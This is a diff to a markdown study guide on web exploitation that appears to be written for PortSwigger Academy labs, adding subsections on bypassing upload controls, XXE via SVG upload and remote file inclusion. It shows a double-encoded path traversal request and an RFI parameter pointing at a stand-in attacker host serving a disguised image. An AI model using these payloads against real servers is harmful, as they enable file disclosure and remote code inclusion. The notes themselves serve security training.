@@ -2019,8 +2019,14 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
   
 [PortSwigger Academy File-path-traversal](https://portswigger.net/web-security/file-path-traversal)  
 
-## File Uploads
+## File Uploads  
+  
+[Bypass Upload Controls](#bypass-upload-controls)  
+[XXE via SVG Image upload](#xxe-via-svg-image-upload)  
+[Remote File Inclusion](#remote-file-inclusion)  
 
+### Bypass Upload Controls  
+  
 >A vulnerable image upload function or avatar logo upload, can by exploited and security controls bypassed to upload content to extract sensitive data or execute code server side.  
 
 >***Identify*** any type of file upload function.  
@@ -2063,6 +2069,18 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 ![xxe svg upload file](images/xxe-svg-upload.png)  
   
 [PortSwigger Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)  
+
+### Remote File Inclusion  
+
+>RFI function on target allow the upload of image from remote HTTPS URL source.  
+
+```
+fileurl=https://EXPLOIT.net/images.svg.png
+```  
+  
+![RFI function](images/RFI-function.png)  
+  
+>Need to identify PortSwigger research about RFI...  
   
 ## Deserialization  
 
